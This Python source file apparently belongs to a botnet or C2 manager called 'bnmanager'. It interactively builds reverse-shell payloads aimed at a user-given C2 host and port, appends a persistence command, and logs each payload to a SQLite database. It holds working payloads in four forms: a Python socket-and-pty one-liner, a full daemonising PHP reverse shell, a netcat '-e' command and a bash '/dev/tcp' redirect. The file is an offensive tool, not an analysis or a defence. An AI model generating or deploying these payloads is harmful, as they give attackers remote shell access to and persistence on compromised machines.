from termcolor import cprint
from os import system
import sqlite3
import datetime


def bot_selector():
    while True:
        cprint("bnmanager/CreateBot/reverse> ", "red", attrs=["bold"], end="")
        try:
            user_input = input().lower()
        except KeyboardInterrupt:
            cprint(
                "Ctrl+C is disabled. You can either \'back\' or \'exit\' instead. Type 'help for more info.",
                "yellow",
            )
            continue
        if user_input == "help":
            reverse_botSelector_help()
        elif user_input == "start":
            reverse_botSelector_start()
        elif user_input == "back":
            return 0
        elif user_input == "exit":
            exit_function()
        else:
            cprint("Invalid Input, type \'help\' for help menu", "yellow")


def reverse_botSelector_help():
    cprint("\nHelp Menu for Creating a Reverse shell\n", attrs=["bold"])
    cprint("help\t\t", attrs=["bold"], end="")
    cprint("Displays this menu")
    cprint("start\t\t", attrs=["bold"], end="")
    cprint("Start creating reverse shell")
    cprint("back\t\t", attrs=["bold"], end="")
    cprint("For going back to previous module")
    cprint("exit\t\t", attrs=["bold"], end="")
    cprint("For Exiting the Manager")
    return 0


def reverse_botSelector_start():

    try:
        cprint(
            "This module will just generate you the reverse shell, for catching the shell you manually need to setup listener in your C2 host.",
            "yellow",
            attrs=["bold"],
        )
        cprint("ReverseShell> ", "green", attrs=["bold"], end="")
        cprint("Enter your C2's IP Address/HostName.", attrs=["bold"])
        cprint("ReverseShell> ", "green", attrs=["bold"], end="")

        user_input = input().lower()
        if user_input == "":
            print("Invalid input")
            return 0

        host = user_input

        cprint("ReverseShell> ", "green", attrs=["bold"], end="")
        cprint("Enter C2's port number to build connection on.", attrs=["bold"])
        cprint("ReverseShell> ", "green", attrs=["bold"], end="")

        user_input = input()
        if user_input == "":
            print("Invalid input")
            return 0
        if not user_input.isnumeric():
            print("Invalid input")
            return 0
        port = user_input

        cprint("ReverseShell> ", "green", attrs=["bold"], end="")
        cprint(
            "Enter command to execute once connection is being established. Mainly a bash command for persistance.",
            attrs=["bold"],
        )
        cprint("ReverseShell> ", "green", attrs=["bold"], end="")
        pre_payload = input()
        pre_payload=pre_payload+" > /dev/null"
        cprint("\nSelect the type of payload you want", attrs=["bold"])
        cprint(
            """1. Python3
2. PHP
3. NetCat
4. Bash -i utility"""
        )

        cprint("ReverseShell> ", "green", attrs=["bold"], end="")
        user_input = input().lower()

        if user_input == "1":
            reverse_python3(port, pre_payload, host)
        elif user_input == "2":
            reverse_php(port, pre_payload, host)
        elif user_input == "3":
            reverse_nc(port, pre_payload, host)

        elif user_input == "4":
            reverse_bash(port, pre_payload, host)
        elif user_input == "back":
            return 0
        elif user_input == "exit":
            exit_function()
        else:
            cprint("Invalid Input! Exiting shell creating mode", "yellow")
            return 0
    except KeyboardInterrupt:
        cprint("Exiting shell creating mode...\n", "yellow")
        return 0


def reverse_python3(port: int, initial_command, host):
    cprint("ReverseShell> ", "green", attrs=["bold"], end="")
    cprint("Give name to this shell", attrs=["bold"])
    cprint("ReverseShell> ", "green", attrs=["bold"], end="")
    name = input()
    pay = """python3 -c 'import socket,subprocess,os;os.system("{2}");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
    pay = pay.format(host, port, initial_command)
    print("Here's your payload\n\n", pay, "\n\n")
    reverse_in_db(name, pay, host, port, initial_command, datetime.datetime.now())


def reverse_php(port: int, initial_command, host):
    cprint("ReverseShell> ", "green", attrs=["bold"], end="")
    cprint("Give name to this shell", attrs=["bold"])
    cprint("ReverseShell> ", "green", attrs=["bold"], end="")
    name = input()
    pay = """<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = ' bnmanagerplaceholderforip ';
$port = bnmanagerplaceholderforport ;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; bnmanagerplaceholderforcommand ; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
"""
    pay = pay.replace("bnmanagerplaceholderforip", host)
    pay = pay.replace("bnmanagerplaceholderforport", port)
    pay = pay.replace("bnmanagerplaceholderforcommand", initial_command)
    print("Here's your payload\n\n", pay, "\n\n")
    reverse_in_db(name, pay, host, port, initial_command, datetime.datetime.now())


def reverse_nc(port: int, initial_command, host):
    cprint("ReverseShell> ", "green", attrs=["bold"], end="")
    cprint("Give name to this shell", attrs=["bold"])
    cprint("ReverseShell> ", "green", attrs=["bold"], end="")
    name = input()
    pay = """nc {0} {1} -e {2} ; /bin/bash"""
    pay = pay.format(host, port, initial_command)
    print("Here's your payload\n\n", pay, "\n\n")
    reverse_in_db(name, pay, host, port, initial_command, datetime.datetime.now())


def reverse_bash(port: int, initial_command, host):
    cprint("ReverseShell> ", "green", attrs=["bold"], end="")
    cprint("Give name to this shell", attrs=["bold"])
    cprint("ReverseShell> ", "green", attrs=["bold"], end="")
    name = input()
    pay = """/bin/bash -c \'{2}; /bin/bash -i >& /dev/tcp/{0}/{1} 0>&1\'"""
    pay = pay.format(host, port, initial_command)
    print("Here's your payload\n\n", pay, "\n\n")
    reverse_in_db(name, pay, host, port, initial_command, datetime.datetime.now())


def reverse_in_db(name, pay, host, port, initital_command, timestamp):
    query = "INSERT INTO REVERSE (pay_name,payload,attacker_host,listener_port,persistence_command,timestamp) VALUES(?,?,?,?,?,?)"
    tup = (name, pay, host, port, initital_command, timestamp)
    cursor = sqlite3.connect('bnmanager.sqlite')
    sql = cursor.cursor()
    sql.execute(query, tup)
    cursor.commit()
    sql.close()


def exit_function():
    cprint("Exiting manager... See you soon!", "green", attrs=["bold"])
    exit(0)
